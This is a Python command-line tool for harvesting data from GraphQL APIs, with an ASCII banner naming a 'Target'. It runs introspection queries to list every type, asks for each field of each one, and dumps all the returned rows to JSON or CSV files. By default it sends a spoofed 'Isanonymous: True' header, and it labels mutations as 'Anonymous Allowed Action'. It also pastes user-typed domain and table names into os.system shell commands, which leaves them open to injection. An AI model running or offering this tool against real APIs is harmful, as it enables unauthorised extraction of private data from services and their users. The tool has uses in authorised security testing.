import requests
from termcolor import colored
import json
import sys
import os
import urllib3
from requests.exceptions import ConnectionError, Timeout, SSLError, RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def logo(d):
	print(colored("\n\n                                               =\\=               =/=","yellow"))
	print(colored("                                                  =\\=         =/=","green"))
	print(colored("                                                     =\\=   =/=","magenta"))
	print(colored("                                                        =|=       ","red"))
	print(colored("                                                     =/=   =\\=","magenta"))
	print(colored("                                                  =/=         =\\=","green"))
	print(colored("                                               =/=               =\\=\n\n","yellow"))
	print(colored(f"                                      Target -> [","white"),colored(d,"red"),colored("]","white"))
	print(colored("                                       Author -> [", "white") + colored("@m00nisSmiling", "green") + colored("]", "cyan"))

os.system("clear")

try:
	sys.argv[1]
except IndexError:
	domain = input(colored("| Add api domain : ", "blue"))
else:
	domain = sys.argv[1]

try:
	sys.argv[2]
except IndexError:
	route = input(colored("| Add graphql route (eg: /v1/graphql) : ","blue"))
else:
	route = sys.argv[2]
		
logo(domain)

os.system(f"mkdir ./{domain} 2> /dev/null")
pp1 = {}
try:
	url = f"http://{domain}{route}"
	requests.get(url,timeout=20, verify=False)
except Exception:
	url = f"https://{domain}{route}"
else:
	if domain[-3:] == "443":
		url = f"https://{domain[:-4]}{route}"
	else:
		pass
	
hinput = input(colored("\n| Do you want to add additional header ? y/n : ","blue")).strip()
if hinput == 'y':
	hinp1 = input(colored("| Header : ","white")).strip()
	hinp2 = input(colored("| Value  : ","white")).strip()
else:
	hinp1 = "Isanonymous"
	hinp2 = "True"
	
	
headers = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    f"{hinp1}":f"{hinp2}"
}

def col(table, csv_or_not):
	payload = {
		"query": f"query {{ __type(name: \"{table}\") {{ fields {{ name }} }} }}"
	}

	try:
		r = requests.post(url, json=payload, headers=headers, timeout=100, verify=False).text
		jr = json.loads(r)
		
		# Check if 'data' or '__type' is None to prevent 'NoneType' object is not iterable
		type_data = jr.get('data', {}).get('__type')
		if not type_data or not type_data.get('fields'):
			print(colored(f"[!] Table '{table}' not found or no fields accessible.", "red"))
			return
			
		fields = type_data['fields']
	except Exception as e:
		print(colored(f"[!] Failed to fetch columns: {e}", "red"))
		return

	# Safe to iterate now
	columns = [f["name"] for f in fields if f["name"] not in ["created_at", "updated_at"]]

	os.system(f"mkdir -p ./{domain}/{table} 2> /dev/null")

	all_rows = []

	for column in columns:
		if table == "mutation_root":
			outputpt = "[<] Anonymous Allowed Action -> "
		else:
			outputpt = "[<] Column Got -> "
			
		print(colored(f"{outputpt}", "yellow"), f"{column}")
		os.system(f"echo '{outputpt}{column}' >> ./{domain}/{table}/column.info &> /dev/null")
		
		payload2 = {
			"query": f"query {{ {table} {{ {column} }} }}"
		}
		
		try:
			r2 = requests.post(url, json=payload2, headers=headers, timeout=100, verify=False).text
			jr2 = json.loads(r2)
			
			# Ensure data exists for the specific table before iterating
			if 'data' in jr2 and jr2['data'] and table in jr2['data']:
				rows = jr2['data'][table]
				if rows is None:
					continue
			else:
				continue
				
		except Exception:
			continue

		for idx, row in enumerate(rows):
			if len(all_rows) <= idx:
				all_rows.append({})
			value = row.get(column)
			all_rows[idx][column] = value
			print(colored(f"[{column}] :", "white"), colored(f" {value}", "magenta"))
		print(colored("--- --- --- --- --- --- --- ---", "yellow"))

	if not all_rows:
		print(colored(f"[!] No data found for table {table}", "red"))
		return

	# Ensure all dictionary rows have the same keys for CSV consistency
	for row in all_rows:
		for col_name in columns:
			row.setdefault(col_name, None)

	json_path = f"./{domain}/{table}/{table}.json"
	with open(json_path, "w", encoding="utf-8") as f:
		json.dump(all_rows, f, indent=4, ensure_ascii=False)
	print(colored(f"[+] JSON saved → {json_path}", "green"))

	if csv_or_not:
		import csv
		csv_path = f"./{domain}/{table}/{table}.csv"
		try:
			with open(csv_path, "w", newline="", encoding="utf-8-sig") as csvfile:
				writer = csv.DictWriter(csvfile, fieldnames=columns)
				writer.writeheader()
				for row in all_rows:
					safe_row = {}
					for k, v in row.items():
						v_str = str(v) if v is not None else ""
						# protect long numeric values from Excel scientific notation
						if v is not None and v_str.isdigit() and len(v_str) >= 10:
							safe_row[k] = f'="{v_str}"'
						else:
							safe_row[k] = v
					writer.writerow(safe_row)
			print(colored(f"[+] CSV saved → {csv_path}", "green"))
		except Exception as e:
			print(colored(f"[!] CSV export failed → {e}", "red"))

def confirm():
	os.system(f"mkdir ./{domain} 2> /dev/null")
	payload = {
    "query": "query { __schema { types { name } } }"
}
	try:
		r = requests.post(url, json=payload, headers=headers, timeout=100, verify=False).text
	except requests.exceptions.SSLError:
		pass
	else:
		try:
			jr = json.loads(r)
		except json.decoder.JSONDecodeError:
			pass
		else:
#		print(jr)
			for i in range(0,20000):	
				try:
					table = jr['data']['__schema']['types'][i]['name']
				except IndexError:
					break
				except KeyError:
					break
				except json.decoder.JSONDecodeError:
					pass
				else:
					print(colored("[Table_name] -> ","white"),table)
					
					
def allinone():
	payload = {
    "query": "query { __schema { types { name } } }"
}
	try:
		r = requests.post(url, json=payload, headers=headers, timeout=100,verify=False).text
	except requests.exceptions.SSLError:
		pass
	else:
		try:
			jr = json.loads(r)
		except json.decoder.JSONDecodeError:
			pass
		else:
			for i in range(0,20000):
				try:
					table = jr['data']['__schema']['types'][i]['name']
				except IndexError:
					break
				except KeyError:
					break
				except json.decoder.JSONDecodeError:
					pass
				else:
					print(colored("[Table_name] -> ","white"),table)
					os.system(f"mkdir ./{domain}/{table} 2> /dev/null")
					col(table,False)
def help():
	print(colored(".\nrdb	- Extract the table schema","green"))
	print(colored("rcol	- Extract the column from table","green"))
	print(colored("clear	- Remove the caches for current session","green"))
	print(colored("csv	- Extract the informations using .csv format","green"))
	print(colored("all	- Dump the whole database schema","green"))
	print(colored("exit	- Exit from tool","green"))
	print(colored("help	- Get help","green"))
def line():
	print(colored(".","blue"))

csvoption = ['n']
def main():
	line()
	option = input(colored("<query> ","red"))
	if option == "rdb":
		print(colored("----------------------------[Tables]------------------------------","blue"))
		confirm()
	elif option == "rcol":
		while True:
			line()
			tbname = input(colored("<tableName> ","red")).strip()
			
			print(colored("----------------------------","blue"),f"[{tbname}]",colored("-----------------------------","blue"))
			if tbname == "exit()":
				sys.exit()
			elif tbname == "main()":
				main()
			elif tbname == "help":
				print(colored("main()	- Back to main console","green"))
				print(colored("exit()	- Exit from tool","green"))
				print(colored("help	- Get help","green"))
			else:
				if csvoption[0] == "y":
					col(tbname,True)
				elif csvoption[0] == "n":
					col(tbname,False)
				else:
					col(tbname,False)
	elif option == "exit":
		sys.exit()
	elif option == "csv":
		tcsv = input(colored("<y/n> ","white"))
		if tcsv == 'y':
			csvoption[0] = 'y'
			print(colored("[!] Changed CSV output mode -> ","magenta"),colored("ON","blue"))
		else:
			csvoption[0] = 'n'
			print(colored("[!] Changed CSV output mode -> ","magenta"),colored("OFF","red"))
	elif option == "clear":
		os.system(f"rm -rf ./{domain}")
	elif option == "all":
		allinone()
	else:
		help()

while True:
	main()
